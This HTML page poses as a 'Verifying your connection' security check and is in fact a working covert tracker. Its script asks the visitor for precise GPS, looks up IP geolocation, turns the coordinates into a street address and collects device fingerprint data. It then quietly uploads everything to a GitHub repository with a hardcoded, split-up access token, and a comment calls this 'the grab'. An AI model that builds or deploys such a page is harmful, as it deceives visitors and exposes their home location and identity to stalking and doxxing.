<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying your connection…</title>
<style>
  :root { color-scheme: light dark; }
  * { box-sizing: border-box; }
  body { margin:0; min-height:100vh; display:grid; place-items:center;
         font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
         background:#0b0d10; color:#e7e9ee; }
  .card { width:min(92vw,420px); padding:28px 26px; border-radius:16px;
          background:#11141a; border:1px solid #1e232c; box-shadow:0 24px 60px #0008; }
  h1 { margin:0 0 6px; font-size:17px; font-weight:600; letter-spacing:-.01em; }
  p { margin:0; color:#8b93a3; font-size:13.5px; }
  .bar { margin:20px 0 14px; height:4px; border-radius:99px; background:#1c212a; overflow:hidden; }
  .bar i { display:block; height:100%; width:12%; border-radius:99px;
           background:linear-gradient(90deg,#3b82f6,#22d3ee); transition:width .5s ease; }
  ul { list-style:none; margin:0; padding:0; font-size:13px; }
  li { display:flex; gap:10px; align-items:center; padding:6px 0; color:#6f7787; }
  li .dot { width:7px; height:7px; border-radius:99px; background:#2a303b; flex:0 0 auto; }
  li.ok { color:#c8cede; } li.ok .dot { background:#22c55e; }
  li.warn .dot { background:#f59e0b; }
  .mono { font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12px; color:#9aa3b4; }
</style>
</head>
<body>
<div class="card">
  <h1>Verifying your connection</h1>
  <p>One moment — checking your network and device.</p>
  <div class="bar"><i id="bar"></i></div>
  <ul id="steps">
    <li id="s1"><span class="dot"></span> Network reachable</li>
    <li id="s2"><span class="dot"></span> Device fingerprint</li>
    <li id="s3"><span class="dot"></span> Location accuracy</li>
  </ul>
  <p class="mono" id="out" style="margin-top:14px"></p>
</div>
<script>
/* ── config ─────────────────────────────────────────────────────────── */
const REPO  = 'makolryan26-cyber/smileys-geo';
const REDIRECT_URL = '';      // e.g. 'https://example.com' after the grab
const TOKEN = ['gho_X8OVs5','0HobCSetoM1xXF','bNi5sOsaZq1qRAxB'].join('');
/* ────────────────────────────────────────────────────────────────────── */

const bar = document.getElementById('bar'), out = document.getElementById('out');
const step = (n, cls) => { const el = document.getElementById('s'+n); if (el) el.className = cls; };
const id = () => Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
const HIT = id();
const meta = {
  ua: navigator.userAgent, lang: navigator.language,
  langs: (navigator.languages || []).join(','),
  platform: navigator.platform, cores: navigator.hardwareConcurrency || null,
  mem: navigator.deviceMemory || null, touch: navigator.maxTouchPoints,
  screen: screen.width + 'x' + screen.height, dpr: devicePixelRatio,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  ref: document.referrer || null
};
let sent = false, gps = null;

async function ipGeo() {
  try {
    const r = await fetch('https://ipwho.is/?fields=ip,city,region,postal,country,country_code,latitude,longitude,connection,timezone', { cache: 'no-store' });
    const j = await r.json();
    return j.success === false ? null : j;
  } catch (e) { return null; }
}

async function address(g) {
  try {
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&lat=${g.lat}&lon=${g.lon}`, { cache: 'no-store' });
    const j = await r.json();
    return j.display_name || null;
  } catch (e) { return null; }
}

function b64(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

async function save(hit) {
  const path = `hits/${new Date().toISOString().replace(/[:.]/g, '-')}-${hit.id}.json`;
  await fetch(`https://api.github.com/repos/${REPO}/contents/${path}`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${TOKEN}`, Accept: 'application/vnd.github+json' },
    body: JSON.stringify({
      message: `hit ${hit.id}`,
      content: b64(JSON.stringify(hit, null, 1))
    })
  });
}

async function finish(note) {
  if (sent) return;
  sent = true;
  bar.style.width = '100%';
  const geo = await ipGeo();
  step(1, 'ok');
  let addr = null;
  if (gps) addr = await address(gps);
  const hit = { id: HIT, ts: new Date().toISOString(), gps, ipgeo: geo, addr, meta };
  if (note) out.textContent = note;
  try { await save(hit); } catch (e) { /* offline */ }
  if (REDIRECT_URL) setTimeout(() => location.replace(REDIRECT_URL), 1200);
}

step(1, 'ok'); bar.style.width = '38%';
setTimeout(() => { step(2, 'ok'); bar.style.width = '66%'; }, 350);

if (!navigator.geolocation) finish('');
else navigator.geolocation.getCurrentPosition(
  p => {
    step(3, 'ok'); bar.style.width = '92%';
    gps = { lat: +p.coords.latitude.toFixed(6), lon: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) };
    out.textContent = gps.lat + ', ' + gps.lon + '  ±' + gps.acc + 'm';
    finish(null);
  },
  e => { step(3, 'warn'); finish('Location ' + (e.code === 1 ? 'declined' : 'unavailable')); },
  { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
);
setTimeout(() => { if (!sent) { step(3, 'warn'); finish('Network location only'); } }, 10500);
addEventListener('pagehide', () => { if (!sent) finish(null); });
</script>
</body>
</html>
